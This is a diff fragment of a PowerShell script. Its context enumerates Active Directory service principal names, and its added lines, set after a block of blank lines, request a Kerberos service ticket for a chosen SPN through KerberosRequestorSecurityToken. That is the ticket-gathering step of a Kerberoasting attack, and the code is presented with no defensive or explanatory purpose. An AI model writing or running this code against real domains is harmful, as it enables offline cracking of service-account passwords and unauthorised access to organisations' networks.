@@ -12,3 +12,19 @@ $searcher.FindAll() | ForEach-Object {
         SPN            = $_.Properties.serviceprincipalname -join ', '
     }
 }
+
+
+
+
+
+
+
+
+# 1. Define the target SPN (e.g., extracted from previous step)
+$spn = "HTTP/webserver.domain.local"
+
+# 2. Add required assembly
+Add-Type -AssemblyName System.IdentityModel
+
+# 3. Request the TGS ticket for the target SPN
+$token = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $spn
